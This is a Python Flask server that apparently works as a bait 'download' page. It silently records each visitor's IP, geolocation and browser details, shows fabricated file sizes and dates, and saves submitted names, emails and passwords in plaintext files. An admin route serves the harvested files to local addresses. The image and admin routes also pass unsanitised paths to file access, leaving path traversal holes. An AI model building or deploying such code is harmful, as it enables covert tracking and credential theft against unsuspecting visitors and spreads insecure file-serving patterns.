from flask import Flask, flash, redirect, render_template, request, session, abort, jsonify, send_file
import requests
import json
import os
from datetime import datetime
import random

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def home(path):
    ip_address = request.remote_addr
    get_ip_info(ip_address)
    return render_template('error.html')

@app.route('/download/', defaults={'filename': ''})
@app.route('/download/<path:filename>')
def download(filename):
    ip_address = request.remote_addr
    get_ip_info(ip_address)
    #return abort(404)
    return render_template('home.html', filename=filename, rand1=str(len(filename))+"MB", rand2="2/7/2020", rand3=str(len(filename)*17))



@app.route('/img/<path:img>')
def getimg(img):
    mypath = "img"
    abs_path = os.path.join(mypath, img)
    return send_file(abs_path)

@app.route('/admin', defaults={'req_path': ''})
@app.route('/admin/<path:req_path>')
def admin(req_path):
    ip_address = request.remote_addr
    response = requests.get("http://ip-api.com/json/{}".format(ip_address))
    js = response.json()
    try:
        msg = js['message']
    except:
        msg = "not admin"
    validIPs = ['127.0.0.1', 'localhost', '0.0.0.0']
    if str(ip_address) in validIPs or str(msg) == "private range":
        mypath = "files"
        abs_path = os.path.join(mypath, req_path)
        # Return 404 if path doesn't exist
        if not os.path.exists(abs_path):
            return abs_path
            #return abort(404)
        # Check if path is a file and serve
        if os.path.isfile(abs_path):
            return send_file(abs_path)
        # Show directory contents
        files = os.listdir(abs_path)
        return render_template('files.html', files=files)
    return msg+"   |  "+ip_address

@app.route('/postmethod', methods=['GET','POST'])
def getdata():
    post = request.form.get("post")
    print(str(post))
    return "a"

@app.route('/submit', methods=['GET','POST'])
def signup():
    ip_address = request.remote_addr
    name = request.form.get("name")
    mail = request.form.get("email")
    psw = request.form.get("psw")
    file = open("files/" + ip_address + "-signup.json", "a")
    file.write('{"name" : "'+name+'",\n')
    file.write('"mail" : "'+mail+'",\n')
    file.write('"Pass" : "'+psw+'"}')
    file.close()
    return render_template('done.html', name=name, mail=mail)

def get_ip_info(ip_address):
    try:
        response = requests.get("http://ip-api.com/json/{}".format(ip_address))
        js = response.json()
        status = js['status']
        if str(status) == "fail":
            return "problem"
        platform = request.user_agent.platform
        browser = request.user_agent.browser
        uas = request.user_agent.string
        dateTimeObj = datetime.now()
        js = str(js)[:-1]+", 'platforn': '"+platform+"'"+", 'browser': '"+browser+"'"+", 'ip_address': '"+ip_address+"'"+", 'timestamp': '"+str(dateTimeObj)+"'"+", 'uas': '"+uas+"' }"
        js = js.replace("\'", "\"")
        js = js.replace("\",", "\",\n")
        #y = json.loads(js)
        #myjson.append({'platform: '+platform})
        #print(js)
        file = open("files/"+ip_address+".json", "w")
        file.write(js)
        file.close()
        return "Success"
        #return render_template('test.html')
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True, port=80)